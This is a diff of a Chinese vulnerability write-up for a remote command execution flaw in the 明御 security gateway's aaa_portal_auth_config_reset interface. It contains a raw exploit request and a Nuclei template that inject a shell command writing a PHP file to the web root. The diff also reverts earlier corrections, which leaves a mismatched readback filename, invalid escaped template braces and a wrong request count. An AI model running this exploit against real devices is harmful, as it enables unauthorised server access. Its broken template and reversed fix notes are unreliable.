@@ -38,7 +38,7 @@ source_status: "recorded"
 - Nuclei双引号变量/DSL中反斜杠花括号非法YAML转义；max-request1却2请求
 - phpinfo证明文件追加写入未清理；修复只最新版本没有公告
 - 这是正确config_reset请求，与安全设备错误贴wchat正文应关联修复不能把二者混并
-- 已落实的文本修订：“http://x.x.x.x/astdfkhl.php”改为“http://x.x.x.x/txzfsrur.php”；“\{”改为“{”；“\}”改为“}”；“max-request: 1”改为“max-request: 2”；HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+- 历史校订意见（原始示例按归档保留，下述改写不再应用于原始示例）：“http://x.x.x.x/astdfkhl.php”改为“http://x.x.x.x/txzfsrur.php”；“\{”改为“{”；“\}”改为“}”；“max-request: 1”改为“max-request: 2”；HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。以上意见置于原始示例之外，不覆盖原文证据；未做运行验证
 - 手工回读路径已与写入文件 txzfsrur.php 一致；Nuclei 花括号去掉错误反斜杠、max-request 改为两次请求。模板只是语法/文本修订，verified 为原作者标记；文件追加及 phpinfo 信息暴露副作用仍存在。
 
 ### 操作风险与恢复
@@ -124,7 +124,7 @@ Connection: close
 第二步，查看生成的文件
 
 ```
-http://x.x.x.x/txzfsrur.php
+http://x.x.x.x/astdfkhl.php
 
 ```
 
@@ -148,31 +148,31 @@ info:
   severity: critical
   description: 明御安全网关秉持安全可视、简单 有效的只理念，以资产为视角，构建全流程防御的下一代安全防护体系，并融合传统防火墙、入侵检测、入侵防御系统、防病毒网关、上网行为管控、VPN网关、威胁情报等安全模块于一体的智慧化安全网关。明御安全网关aaa_portal_auth_config_reset接口处存在RCE漏洞，攻击者通过漏洞可以获取服务器权限.
   metadata:
-    max-request: 2
+    max-request: 1
     fofa-query: title="明御安全网关"
     verified: true
 variables:
-  file_name: "{{to_lower(rand_text_alpha(8))}}"
-  file_content: "{{to_lower(rand_text_alpha(30))}}"
+  file_name: "\{\{to_lower(rand_text_alpha(8))\}\}"
+  file_content: "\{\{to_lower(rand_text_alpha(30))\}\}"
 requests:
   - raw:
       - |+
-        GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22{{file_content}}%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F{{file_name}}.php%0a HTTP/1.1
-        Host: {{Hostname}}
+        GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22\{\{file_content\}\}%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F\{\{file_name\}\}.php%0a HTTP/1.1
+        Host: \{\{Hostname\}\}
         User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
         Accept-Encoding: gzip, deflate
         Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
         Connection: close
       - |
-        GET /{{file_name}}.php HTTP/1.1
-        Host: {{Hostname}}
+        GET /\{\{file_name\}\}.php HTTP/1.1
+        Host: \{\{Hostname\}\}
         User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
         Accept-Encoding: gzip
     matchers:
       - type: dsl
         dsl:
-          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '\{\{file_content\}\}')"
 
 ```
 
